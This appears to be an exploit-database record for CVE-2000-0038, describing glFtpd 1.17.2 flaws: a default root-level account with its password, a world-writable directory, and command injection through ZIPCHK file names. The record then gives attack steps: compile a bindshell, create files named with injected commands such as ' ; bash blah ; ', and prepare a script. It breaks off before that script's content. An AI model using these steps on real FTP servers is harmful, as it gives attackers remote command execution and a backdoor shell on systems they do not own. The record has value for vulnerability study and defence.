    "text": "ecve : CVE-2000-0038 ， title : glFTPd 1.17.2 - Code Execution - Unix remote Exploit ， verified : Verified ， exploit_detail : source :  ， GlFtpd is a popular alternative to the mainstream unix ftp daemons and is currently in wide use on the internet. There are three known serious vulnerabilities in GlFtpd. The first problem is an account which is created by default upon installation of the software. The username and password for this account are both \"gltftpd\" and the uid is 0 ( root ) . This account can only be used by users connecting from localhost. This is a problem because \"local users\" can log into a host's glftpd with root privileges ( and compromise the entire system ) . The second problem is world writeable ~ /site directory. The last problem is the possibility to execute arbitrary commands on the target host. Glftpd comes with a feature called ZIPCHK , which is a command sent to the ftpd to check the integrity of a zip file on the server remotely. ZIPCHK executes \"unzip\" on the file without validating the filename input. With a special filename such as \" ; ls\" , it is possible to execute arbitrary commands as the uid of glftpd. ， Exploit Information :  ， 1 ) & 2 ) are traditionally bad. Problems are obvious. ， 3 ) This is quite simple a user need only have some place to upload files :  ， - You will need to build some kind of backdoor to allow you access , using bindshell.c ( again )  ，  $ gcc bindshell.c -o b -static ， - Create an empty file called \" ; bash blah ; \" ， - Create an empty file called \" ; unzip blah ; \" ，  $ > \" ; bash blah ; \" ， - Create a script called \"blah\" : ",
